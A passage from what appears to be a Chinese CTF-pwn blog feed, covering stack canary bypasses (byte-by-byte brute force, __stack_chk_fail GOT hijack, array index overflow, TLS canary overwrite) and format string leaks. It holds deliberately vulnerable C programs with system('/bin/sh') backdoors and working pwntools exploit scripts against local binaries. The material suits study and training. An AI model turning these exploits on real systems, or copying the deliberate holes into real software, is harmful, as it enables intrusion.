class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time <span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./one_by_one"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./one_by_one"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"Find %d"</span> <span class="token operator">%</span> k<span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#print "Check %d for %d" % (b, k)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>b<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Hacker!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'stack smashing detected'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">'the %d is %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> b<span class="token punctuation">)</span>canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>b<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token keyword">break</span> <span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/6.png"></p><h2 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在开启canary保护的程序中，如果canary不对，程序会转到**__stack_chk_fail函数执行**。__stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>测试代码：</p><ul><li>程序存在格式化字符串漏洞，且有后门函数</li><li>这里只有一次read–printf机会，所以不能leak canary后再攻击</li><li>利用格式化字符串漏洞任意地址写，将__stack_chk_fail的got表项内容替换为getshell函数地址</li><li>触发Canary，执行__stack_chk_fail ==&gt; getshell</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -m32 stack_chk_fail.c -o stack_chk_fail</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span><span class="token comment">#格式化字符串地址相对于格式化字符串的偏移为10</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数组下标越界绕过Canary"><a href="#数组下标越界绕过Canary" class="headerlink" title="数组下标越界绕过Canary"></a>数组下标越界绕过Canary</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>当程序中存在数组，没有对边界进行检查时，如果我们可以对数组进行对应位置修改，我们就可以绕过canary检测，直接修改返回地址。所以如果可以对arr数组任意位置进行修改，这就存在数组下标溢出。</p><p>以下图为例，数组大小为3，但是没有对数组的下标进行检查，这时返回地址就相当于arr[5]，如果我们对arr[5]进行修改就是对返回地址进行修改。</p><p><img src="/2023/04/09/canary/0.png"></p><h2 id="覆盖-TLS-中储存的-Canary-值-（具体见Canary-TLS-Blog"><a href="#覆盖-TLS-中储存的-Canary-值-（具体见Canary-TLS-Blog" class="headerlink" title="覆盖 TLS 中储存的 Canary 值 （具体见Canary-TLS Blog"></a>覆盖 TLS 中储存的 Canary 值 （具体见Canary-TLS Blog</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p><strong>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。（一般是针对子线程</strong></p><p>如果我们溢出的足够大，大到能够覆盖到fs/gs寄存器对应偏移位的值，我们就可以修改canary为我们设计好的值，这样在程序检测时就会和我们匹配的值进行检测，从而绕过canary保护。在初始化canary时，<strong>fs寄存器指向的位置是TLS结构体</strong>，而fs指向的位置加上0x28偏移的位置取出来的canary就在TLS结构体里面。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canary绕过与利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2023/04/08/ge-shi-hua-zi-fu-chuan/"/>
      <url>/2023/04/08/ge-shi-hua-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><h4 id="格式化字符串-函数"><a href="#格式化字符串-函数" class="headerlink" title="格式化字符串(函数"></a>格式化字符串(函数</h4><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。一般来说，格式化字符串在利用的时候主要分为以下三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，<strong>可选(就是相应的要输出的变量</strong></li></ul><p><strong>格式化字符串</strong>基本格式：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span>type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>parameter<ul><li><font color="red">n$，获取格式化字符串中的指定参数</font>(n为参数列表中的第几个参数)</li></ul></li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li><font color="red">hh，输出一个字节</font></li><li><font color="red">h，输出一个双字节</font></li></ul></li><li>type<ul><li><font color="red">n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</font></li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><h4 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h4><p>格式化字符串函数是根据格式化字符串来进行解析的。**那么相应的<font color="red">要被解析的参数的个数由这个格式化字符串所控制</font>**。比如说’%s’表明我们会输出一个字符串参数。</p><p>eg：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在调用printf前栈中的分布(x86)：</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/1.png"></p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>我们把代码修改为如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时栈中的分布如下：</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/2.png"></p><p>此时我们可以发现<strong>我们并没有提供参数</strong>，那么程序会如何运行呢？程序照样会运行，<strong>会将栈上存储格式化字符串地址上面的三个变量分别解析为：</strong></p><ol><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li><li>解析其地址对应的字符串</li></ol><p>对于 1，2 来说倒还无妨，但是对于 3 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/3.png"></p><p>这里给大家出个小问题：请问下面这段代码的输出结果是什么？？</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s, x = %d, %n x = %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x = %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/4.png"></p><p>为什么第一个printf输出的x都是200呢？而下面是49呢？请自行查看在调用printf函数之前的栈分布。</p><h3 id="格式化字符串漏洞的利用"><a href="#格式化字符串漏洞的利用" class="headerlink" title="格式化字符串漏洞的利用"></a>格式化字符串漏洞的利用</h3><h4 id="泄漏内存"><a href="#泄漏内存" class="headerlink" title="泄漏内存"></a>泄漏内存</h4><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li><li>盲打，dump 整个程序，获取有用信息。</li></ul></li></ul><h5 id="泄漏栈内存"><a href="#泄漏栈内存" class="headerlink" title="泄漏栈内存"></a>泄漏栈内存</h5><h6 id="获取栈变量的值"><a href="#获取栈变量的值" class="headerlink" title="获取栈变量的值"></a>获取栈变量的值</h6><p>这里给出wiki上的例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们输入%p-%p-%p</p><ul><li>程序断在第一个printf处</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">此时栈分布为：返回地址格式化字符串 <span class="token operator">=</span> <span class="token string">"%08x.%08x.%08x.%s\n"</span>参数<span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x1</span>参数<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">0x22222222</span>参数<span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0xffffffff</span>参数<span class="token number">4</span> <span class="token operator">=</span> address of <span class="token char">'%p-%p-%p'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/5.png"></p><ul><li>程序断在第二个printf处</li></ul><pre class="line-numbers language-none"><code class="language-none">此时栈分布：返回地址格式化字符串 = "%p-%p-%p"0xffffd0080xf7ffd9180xf0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意我这里并没有说成参数，但是当解析格式字符串时，会把栈中的值按照类型进行解析并输出，所以输出为<code>0xffffd008-0xf7ffd918-0xf0</code>。这里其实就泄漏了栈地址。</p><p>note：并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为<strong>栈是不对内存页做初始化</strong>。</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/6.png"></p><p><strong>需要注意的是，上面给出的方法，都是依次获得栈中的每个参数，我们可以直接获取栈中被视为第 n+1 个参数的值：<code>%n$x</code></strong> – <font color="red">n针对的是格式化字符串的参数</font></p><ul><li><strong>注意区别<font color="red">格式化字符串</font>的参数与<font color="red">格式化字符串函数</font>的参数</strong></li></ul><p>如输入<code>%6$p</code></p><ul><li>可以看到我们打印出了printf的第7个参数，格式化字符串的第6个参数</li></ul><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/7.png"></p><h6 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h6><p>利用<code>%s</code>可以获取栈变量对应字符串 ，<strong>但是，不是所有<code>%s</code>都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/8.png"></p><p>小总结：</p><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol><h5 id="泄漏任意地址内存"><a href="#泄漏任意地址内存" class="headerlink" title="泄漏任意地址内存"></a>泄漏任意地址内存</h5><p>一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，<strong>第一个参数的值其实就是该格式化字符串的地址。</strong></p><p>可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffcfe0，同时该地址存储的也确实是<code>'%s'</code>格式化字符串内容。</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/9.png"></p><p>那么由于我们可以控制该格式化字符串，如果我们知道该<strong>格式化字符串在输出函数调用时是第几个参数</strong>，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">addr<span class="token operator">%</span>k$s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般来说，我们会<strong>重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p</strong> 来输出栈上的内容，如果<strong>内容与我们前面的 tag 重复了</strong>，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，只是加了个<code>puts</code>函数如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现格式化字符串的起始地址是格式化字符串的第10个参数</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/10.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./leak"</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io, 'b main')</span><span class="token comment">#pause()</span><span class="token comment">#context.log_level = 'debug'</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%10$s'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token 